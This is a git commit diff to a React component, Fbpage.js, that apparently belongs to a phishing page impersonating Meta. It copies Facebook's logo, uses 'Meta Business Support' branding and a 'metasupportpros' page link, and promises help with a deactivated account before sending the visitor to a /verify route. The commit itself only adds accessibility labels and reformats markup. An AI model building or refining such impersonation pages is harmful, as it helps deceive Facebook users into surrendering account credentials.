f3914d586fba35aef2b11371f837f2294814601f
ragalcha <119405754+ragalcha@users.noreply.github.com>
2024-07-25 13:26:37 +0530

    Update Fbpage.js

--- src/Components/Fbpage.js
+++ src/Components/Fbpage.js
@@ -1,6 +1,7 @@
 import React from 'react';
 import './Fbpage.css';
 import { Link } from 'react-router-dom';
+
 function Fbpage() {
     const headerStyle = {
         background: '#fff',
@@ -23,7 +24,7 @@ function Fbpage() {
                     <div className="header-container">
                         <div className="w-25">
                             <div className="logo-area">
-                                <svg viewBox="0 0 36 36" className="k0f0a27 _a4pc" fill="currentColor" height="40" width="40">
+                                <svg viewBox="0 0 36 36" className="k0f0a27 _a4pc" fill="currentColor" height="40" width="40" aria-label="Logo">
                                     <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
                                     <path className="q61vvz9" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path>
                                 </svg>
@@ -47,7 +48,12 @@ function Fbpage() {
                                         <tr>
                                             <td valign="top">
                                                 <a href="https://www.facebook.com/metasupportpros" style={{ color: '#1b74e4', textDecoration: 'none' }}>
-                                                    <img width="64" src="TbXLmqW3Z.png" style={{ border: 'solid 1px rgba(0,0,0,0.15)', borderRadius: '50%' }} />
+                                                    <img 
+                                                        width="64" 
+                                                        src="TbXLmqW3Z.png" 
+                                                        alt="Meta Business Support" 
+                                                        style={{ border: 'solid 1px rgba(0,0,0,0.15)', borderRadius: '50%' }} 
+                                                    />
                                                 </a>
                                             </td>
                                             <td>
@@ -59,9 +65,9 @@ function Fbpage() {
                             </div>
                             <div className="Tex3">We will walk you through several steps to cancel a deactivated account.</div>
                             <div className="justify-content-end w-full">
-                            <Link  className="btn btn-lg btn-primary" to="/verify" style={buttonStyle} >
-                                continue</Link>
-                              
+                                <Link className="btn btn-lg btn-primary" to="/verify" style={buttonStyle}>
+                                    continue
+                                </Link>
                             </div>
                         </div>
                     </div>
